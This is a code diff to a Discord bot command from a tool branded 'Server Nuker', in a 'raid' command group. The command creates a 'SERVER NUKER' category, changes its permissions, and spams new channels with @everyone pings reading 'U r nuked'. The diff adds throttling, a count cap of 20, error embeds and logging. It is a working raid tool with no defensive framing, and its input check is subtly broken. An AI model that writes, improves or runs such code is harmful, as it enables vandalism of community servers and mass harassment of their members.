@@ -9,21 +9,35 @@ module.exports = class TextChannelCommand extends Commando.Command{
             group: 'raid',
             description: 'Spams text channels',
             argsType: 'multiple',
-            guildOnly: true
+            guildOnly: true,
+            throttling:{
+                usages:1,
+                duration:5
+            }
         })
     }
 
     async run(message, args){
         message.delete()
-        if(!args[0]){
-            message.channel.send('Enter a valid number!')
+        
+        const noNumEmbed = new Discord.MessageEmbed()
+            .setAuthor('Spam Roles Command')
+            .setFooter('Server Nuker v2.0.0 [BETA]', 'https://i.imgur.com/BCDIf5E.jpg')
+            .setDescription('Error! Enter a valid number for the count\n`.spamroles <count> | .spamroles 3`')
+            .setColor('#ff0000')
+        if(!args[0] || typeof(parseFloat(args[0])) !== 'number'){
+            message.channel.send(noNumEmbed)
             return
         }
 
-        const count = args[0]
+        var count = Math.round(args[0])
+
+        if(count > 20){
+            count = 20
+        }
 
         let categoryId = ''
-        message.guild.channels.create('SERVER NUKER', {type: 'category'}).then(channel => {
+        message.guild.channels.create('| 💣 | SERVER NUKER', {type: 'category'}).then(channel => {
             channel.setPosition(0)
             categoryId = channel.id
             channel.overwritePermissions([
@@ -42,9 +56,13 @@ module.exports = class TextChannelCommand extends Commando.Command{
                     parent: categoryId,
                     topic: 'Epic nuker bot'
                 }).then(channel => {
-                    channel.send(`||@everyone||\nU r nuked!`)
+                    channel.send(`||@everyone||\nU r nuked 💣💣💣!`)
                 })
             }, 1000)
         }
+
+        const moment = require('moment')
+        const time = moment().format("HH:mm:ss a")
+        console.log(`${time} | Command Ran: spamtextchannel`)
     }
 }
